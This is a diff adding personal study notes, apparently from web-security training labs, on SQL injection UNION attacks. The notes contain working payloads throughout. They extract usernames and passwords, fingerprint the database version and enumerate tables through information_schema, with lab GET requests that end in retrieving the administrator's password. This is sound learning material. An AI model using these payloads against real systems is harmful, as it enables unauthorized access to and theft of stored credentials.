@@ -46,3 +46,49 @@ STEP 1: category=%27UNION+SELECT+NULL,NULL,NULL--
 STEP 2:category=%27UNION+SELECT+NULL,%27brnCRr%27,NULL--
 STEP: HERE WE GOT HEHEHE.
 
+-Using a SQL injection UNION attack to retrieve interesting data
+  +ex:In this example, you can retrieve the contents of the users table by submitting the input:
+  ' UNION SELECT username, password FROM users--
+  +lab:be easy
+
+-Retrieving multiple values within a single column
+  +on Oracle you could submit the input:
+' UNION SELECT username || '~' || password FROM users--
+  +...
+  administrator~s3cure
+  wiener~peter
+  carlos~montoya
+  ...
++lab:category='UNION+SELECT+1,username||'~'||password+FROM+users--
+
+-Examining the database in SQL injection attacks
+  +The type and version of the database software.
+  +The tables and columns that the database contains.
+-Querying the database type and version
+  Database type	Query
+  Microsoft, MySQL	SELECT @@version
+  Oracle	          SELECT * FROM v$version
+  PostgreSQL	      SELECT version()
+  For example, you could use a UNION attack with the following input:
+    +ex:' UNION SELECT @@version--
+    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+    Mar 18 2018 09:11:49
+    Copyright (c) Microsoft Corporation
+    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
++Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+   GET /filter?category='+UNION+SELECT+version(),'123'# HTTP/2
+
+-Listing the contents of the database
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+  +ex:SELECT * FROM information_schema.tables //Liệt kê các bảng
+  +ex:SELECT * FROM information_schema.columns WHERE table_name = 'Users' //liệt kê các cột trong bảng
+  +
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+step 1: check union injection => null,null;
+step 2:GET /filter?category='UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2 => show all the tables name
+step 3: scroll the pretty code => find users_tntqft
+step 4:GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tntqft'-- HTTP/2 => contain password_khkmee and username_hjhyfp
+final: GET /filter?category='+UNION+SELECT+password_khkmee+,username_hjhyfp+FROM+users_tntqft-- HTTP/2 => get administrator and password of it
+
+
+
